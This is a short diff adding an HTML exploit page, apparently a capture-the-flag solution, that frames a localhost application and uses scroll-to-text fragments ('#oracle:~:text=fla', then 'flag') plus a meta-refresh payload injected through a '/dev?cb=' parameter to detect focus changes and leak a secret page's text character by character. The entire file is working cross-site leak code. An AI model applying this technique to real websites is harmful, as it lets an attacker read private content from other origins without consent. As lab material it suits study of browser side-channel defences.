@@ -1,0 +1,13 @@
+<html>
+    <body>
+        <iframe src='http://localhost:3000/#oracle:~:text=fla' height=150px width=290px></iframe>
+    </body>
+    <script>
+        var url = 'http://localhost:3000/dev?cb='
+        setTimeout( ()=> {
+            frames[0].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;http://localhost:3000/#oracle:~:text=flag">`);
+            console.log('changing focus');
+        },2000);
+
+    </script>
+</html>
